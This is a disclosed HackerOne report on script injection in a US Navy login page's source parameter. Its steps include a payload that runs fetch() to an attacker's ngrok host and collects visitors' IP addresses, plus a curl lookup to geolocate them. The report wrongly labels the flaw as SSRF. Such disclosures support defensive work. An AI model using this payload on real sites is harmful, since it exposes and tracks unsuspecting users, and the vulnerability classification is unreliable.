# SSRF in login page using fetch API exposes victims IP address to attacker controled server

## Report Details
- **Report ID**: 996273
- **URL**: https://hackerone.com/reports/996273
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-10-02T04:44:22.085Z
- **Disclosed**: 2021-01-12T21:41:19.842Z

## Reporter
- **Username**: iamrose
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Note:      This is similar to my last report #991163. 


**Summary:**
 Server Side Request Forgery Exposes Victims Ip Address to External Server and which made attacker possible to determine physical location of Victim with IP Tracing.
**Description:**
Server Side Request Forgery is the critical vulnerability occurring in web application where attacker can perform malicious action on behalf of server. SSRF can lead to port scanning, cross domain hijacking, pivoting , extracting system files and many more. In this case, I use ngrok to generate our custom domain to prove occurrence of SSRF. Once I have custom ngrok domain i can analyze all request that are coming to the domain.
I used fetch() API property of JS to perform cross domain request and perform Server Side Request Forgery.
 

## Step-by-step Reproduction Instructions
1. Open the URL https://www.█████████
2. Open your ngrok instance and copy your listener domain it
3. SSRF payload  '><script>fetch('your ngrok instance')</script>
4. Append payload to source parameter
5. Final Crafted URL████&source='><script>fetch('your ngrok instance')</script>&server=submit.moboard.com&display=Please+log+on&title=%3C
6. Open 127.0.0.1:4040 in browser to analyze all incoming request
7. Open URL of Step 5 from any other device than the device ngrok is running 
8.  The request from US navy hits our ngrok client in 127.0.0.1:4040
9. The request contain ip address of victim who opened the URL, browser info, Operating System and many more.
10. We can trace victim location with ~$curl ipinfo.io/IP-address-of-victim

Screenshot is attached below with the request from navy server that hit my ngrok client


## Product, Version, and Configuration (If applicable)
Browser: Firefox 80.0.1 64 Bit
## Suggested Mitigation/Remediation Actions

## Impact

Server Side Request Forgery Exposes Victims Ip Address to External Server and which made attacker possible to determine physical location of Victim with IP Tracing. Also, attacker can launch port scans, launch exploits to whoever visits the US NAVY Website.

## Attachments
No attachments
